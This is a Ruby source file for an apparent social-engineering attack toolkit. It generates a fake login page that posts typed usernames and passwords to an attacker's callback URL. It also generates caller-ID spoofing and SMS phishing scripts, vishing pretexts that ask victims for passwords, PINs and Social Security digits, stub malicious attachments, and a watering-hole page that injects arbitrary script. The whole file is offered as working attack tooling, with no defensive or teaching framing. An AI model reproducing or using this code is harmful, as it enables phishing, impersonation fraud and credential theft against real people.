require 'securerandom'
require_relative '../utils/colorize'

class SocialEngineering
  def self.generate_credential_harvester(target_service, callback_url)
    harvester = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>#{target_service} Login</title>
        <style>
          body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 50px; }
          .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
          input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
          button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }
        </style>
      </head>
      <body>
        <div class="container">
          <h2>#{target_service} Login</h2>
          <form id="loginForm">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
          </form>
        </div>
        <script>
          document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            var data = {};
            formData.forEach(function(value, key) {
              data[key] = value;
            });
            
            fetch('#{callback_url}', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
            });
            
            setTimeout(function() {
              alert('Invalid credentials. Please try again.');
            }, 1000);
          });
        </script>
      </body>
      </html>
    HTML
    
    filename = "harvester_#{target_service.downcase.gsub(' ', '_')}_#{Time.now.to_i}.html"
    File.write(filename, harvester)
    puts Colorize.green("Credential harvester saved: #{filename}")
    filename
  end

  def self.generate_phone_number_spoofer(target_number, caller_id)
    spoofer = <<~RUBY
      require 'net/http'
      require 'uri'
      
      target = '#{target_number}'
      caller_id = '#{caller_id}'
      
      services = [
        'https://api.spoofcall.com/call',
        'https://api.fakecall.net/make',
        'https://api.prankcall.io/start'
      ]
      
      services.each do |service|
        begin
          uri = URI(service)
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = true
          
          req = Net::HTTP::Post.new(uri.path)
          req['Content-Type'] = 'application/json'
          req.body = {
            target: target,
            caller_id: caller_id
          }.to_json
          
          res = http.request(req)
          puts "Response: #{res.code}"
        rescue => e
          puts "Error: #{e.message}"
        end
      end
    RUBY
    
    filename = "phone_spoofer_#{Time.now.to_i}.rb"
    File.write(filename, spoofer)
    puts Colorize.green("Phone spoofer script saved: #{filename}")
    filename
  end

  def self.generate_sms_phishing(target_number, message, link)
    sms = <<~RUBY
      require 'net/http'
      require 'uri'
      
      target = '#{target_number}'
      message = '#{message}'
      link = '#{link}'
      
      services = [
        'https://api.twilio.com/2010-04-01/Accounts/ACxxxxx/Messages.json',
        'https://api.nexmo.com/v1/messages',
        'https://api.textbelt.com/text'
      ]
      
      full_message = message + ' ' + link
      
      services.each do |service|
        begin
          uri = URI(service)
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = true
          
          req = Net::HTTP::Post.new(uri.path)
          req['Content-Type'] = 'application/json'
          req.body = {
            to: target,
            text: full_message
          }.to_json
          
          res = http.request(req)
          puts "SMS sent via #{service}: #{res.code}"
        rescue => e
          puts "Error: #{e.message}"
        end
      end
    RUBY
    
    filename = "sms_phishing_#{Time.now.to_i}.rb"
    File.write(filename, sms)
    puts Colorize.green("SMS phishing script saved: #{filename}")
    filename
  end

  def self.generate_pretext_scenario(scenario_type, target_info)
    scenarios = {
      'tech_support' => {
        script: <<~SCRIPT
          Hello, this is #{target_info[:caller_name]} from Technical Support. We've detected suspicious activity on your account and need to verify your identity immediately.
          
          Can you please confirm:
          1. Your full name
          2. Your date of birth
          3. The last 4 digits of your social security number
          4. Your account password
          
          This is urgent - your account may be compromised.
        SCRIPT
      },
      'bank_security' => {
        script: <<~SCRIPT
          Good day, this is #{target_info[:caller_name]} from #{target_info[:bank_name]} Security Department. We've flagged several unauthorized transactions on your account.
          
          To prevent further fraud, we need you to:
          1. Verify your account number
          2. Confirm your PIN
          3. Provide your online banking password
          4. Answer your security questions
          
          This call is being recorded for security purposes.
        SCRIPT
      },
      'it_department' => {
        script: <<~SCRIPT
          Hi, this is #{target_info[:caller_name]} from IT. We're performing a security update and need to verify your credentials.
          
          Please provide:
          1. Your username
          2. Your current password
          3. Your email address
          
          This is a routine security check.
        SCRIPT
      }
    }
    
    scenario = scenarios[scenario_type] || scenarios['tech_support']
    filename = "pretext_#{scenario_type}_#{Time.now.to_i}.txt"
    File.write(filename, scenario[:script])
    puts Colorize.green("Pretext scenario saved: #{filename}")
    filename
  end

  def self.generate_attachment_payload(filename, payload_type = 'exe')
    payloads = {
      'exe' => 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21',
      'pdf' => '%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n',
      'doc' => "\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
      'zip' => "PK\x03\x04\x14\x00\x00\x00\x08\x00"
    }
    
    payload = payloads[payload_type] || payloads['exe']
    File.binwrite(filename, payload)
    puts Colorize.green("Payload file created: #{filename}")
    filename
  end

  def self.generate_watering_hole(url, malicious_script)
    watering_hole = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>#{url}</title>
        <script>
          #{malicious_script}
        </script>
      </head>
      <body>
        <h1>Welcome</h1>
        <p>This page has been compromised.</p>
      </body>
      </html>
    HTML
    
    filename = "watering_hole_#{Time.now.to_i}.html"
    File.write(filename, watering_hole)
    puts Colorize.green("Watering hole page saved: #{filename}")
    filename
  end
end

